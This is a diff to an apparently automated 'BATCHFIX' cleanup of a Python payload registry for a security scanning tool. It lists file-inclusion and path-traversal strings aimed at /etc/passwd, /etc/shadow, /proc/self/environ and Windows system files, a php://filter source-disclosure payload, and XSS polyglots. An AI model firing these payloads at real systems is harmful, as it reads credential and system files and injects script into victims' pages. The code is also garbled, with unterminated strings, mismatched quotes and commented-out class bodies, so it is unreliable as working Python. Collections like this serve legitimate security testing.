@@ -26,7 +26,7 @@ from typing import List
 class PayloadIntelligence:
 # [BATCHFIX] Commented metadata/non-Python
 #     pass  # [BATCHFIX] inserted for empty class
-""""
+"""
 Consolidated registry of high-impact security payloads.#     LFI_PAYLOADS = [
         "/etc/passwd","        "/etc/shadow","        "C:\\Windows\\win.ini","        "C:\\Windows\\System32\\drivers\\etc\\hosts","        "../../../../etc/passwd","        "..\\..\\..\\..\\Windows\\win.ini","        "/proc/self/environ","        "/var/log/apache2/access.log","        "php://filter/convert.base64-encode/resource=index.php","    ]
 
@@ -49,7 +49,7 @@ def get_payloads(category: str) -> List[str]:"Retrieve payloads for a specific c
 """ [BATCHFIX] Commented metadata/non-Python"""
 # [BATCHFIX] Commented metadata/non-Python
 """
-return []""""
+return []""
     @staticmethod
 # [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented metadata/non-Python"""
@@ -65,4 +65,4 @@ def get_xss_polyglots() -> List[str]:"Polyglot payloads that work in multiple co
 """ [BATCHFIX] Commented unterminated string"""
 #             "'\"><svg/onload=alert(1)>","  # [BATCHFIX] closed string"'            "javascript:alert(1)//","        ]
 
-"""
+""
